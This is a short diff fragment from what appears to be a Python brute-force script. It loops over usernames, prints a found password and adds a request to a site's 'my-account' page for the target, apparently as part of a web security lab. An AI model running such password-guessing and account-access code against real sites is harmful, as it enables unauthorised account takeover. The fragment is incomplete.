@@ -38,3 +38,5 @@ for user in username_list:
                     print(f'Password is: {target_password}')
         except:
             print(f'Password is: {target_password}')
+            break
+s.get(f'https://{site}/my-account?id={target}')
